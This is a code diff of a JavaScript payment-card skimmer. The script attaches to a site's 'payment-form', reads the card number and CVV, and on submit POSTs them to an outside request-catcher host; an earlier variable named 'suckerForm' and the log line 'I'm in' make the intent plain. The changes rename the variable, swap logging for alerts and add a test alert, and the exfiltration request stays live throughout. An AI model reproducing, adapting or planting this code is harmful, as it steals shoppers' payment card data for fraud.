@@ -1,9 +1,7 @@
 console.log("I'm in");
 
 window.addEventListener('DOMContentLoaded', () => {
-    const suckerForm = document.getElementById('payment-form');
-
-    suckerForm.addEventListener('submit', async () => {
+    paymentForm.addEventListener('submit', () => {
         // Remove any spaces the user might have entered
         const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');
 
@@ -15,9 +13,9 @@ window.addEventListener('DOMContentLoaded', () => {
                 cvv: document.getElementById('cvv').value
             }
 
-            console.log(userData);
+            alert(userData);
 
-            await fetch("https://madwolf.requestcatcher.com/jackknife", {
+            fetch("https://madwolf.requestcatcher.com/jackknife", {
                 method: "POST",
                 headers: {
                     'Content-Type': 'application/json'
@@ -25,5 +23,7 @@ window.addEventListener('DOMContentLoaded', () => {
                 body: JSON.stringify(userData)
             });
         }
+
+        alert("test");
     });
 });
